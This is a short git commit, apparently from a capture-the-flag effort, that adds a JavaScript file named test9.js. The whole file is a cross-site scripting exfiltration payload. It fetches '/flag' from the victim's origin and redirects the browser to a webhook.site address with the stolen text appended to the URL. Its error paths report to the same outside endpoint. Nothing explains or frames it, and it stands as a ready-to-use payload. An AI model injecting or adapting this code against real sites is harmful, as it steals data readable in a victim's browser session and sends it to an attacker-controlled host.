dcbfe63c7ede0500dbe90e54f2aae192ae35501e
Emyr298 <emi.ru298@gmail.com>
2023-12-03 10:22:34 +0700

    s

---
+++ test9.js
@@ -0,0 +1,9 @@
+fetch('/flag').then((res) => {
+    res.text().then((test) => {
+        window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${encodeURIComponent(test)}`;
+    }).catch((owo) => {
+        window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/error2`;
+    })
+}).catch((owo) => {
+    window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/error`;
+})
